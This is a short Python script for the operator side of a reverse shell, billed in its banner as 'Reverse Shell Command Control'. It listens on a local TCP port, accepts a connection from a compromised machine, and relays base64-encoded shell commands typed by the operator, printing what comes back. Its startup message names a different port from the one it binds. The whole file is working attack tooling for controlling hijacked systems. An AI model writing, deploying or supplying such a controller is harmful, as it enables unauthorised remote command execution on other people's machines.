import socket
import pyfiglet
import os
import base64

"""This function is used to encode the data to be send"""
def en(data):
    return base64.b64encode(data.encode())

"""This is used to decode the instructions arriving from the remote computer"""
def de(data):
    return base64.b64decode(data)

"""This is the driver code"""
def main():
    # Display the initial message
    os.system('tput clear')
    f=pyfiglet.Figlet(font='cybermedium')
    print(f.renderText('Reverse Shell Command Control'))
    print ('\033[1m')
    print("Simplifies command execution on a system with reverse shell access")
    print ('\033[0m')

    # Creating a command center service on a specific port
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('localhost',8006))
    s.listen(2)
    print('Listening on port 8001 for connections...')
    (client, (ip,port))=s.accept()
    print("Received connection from ",ip," port:",port)
    print("Client is:",client)

    while True:
        a=en('pwd')
        client.send(a)
        r1=client.recv(2048).decode()
        r=de(r1).decode()
        # print("Current directory is:",r)
        c=input('~'+r[:len(r)-2]+'$')
        c=en(c)
        # Sending the encoded command to the remote system
        client.send(c)
        res1=client.recv(2048).decode()
        res=de(res1).decode().split('~')
        if res[1]:
            print(res[1])
        else:
            print(res[0])



if __name__ == '__main__':
    main()
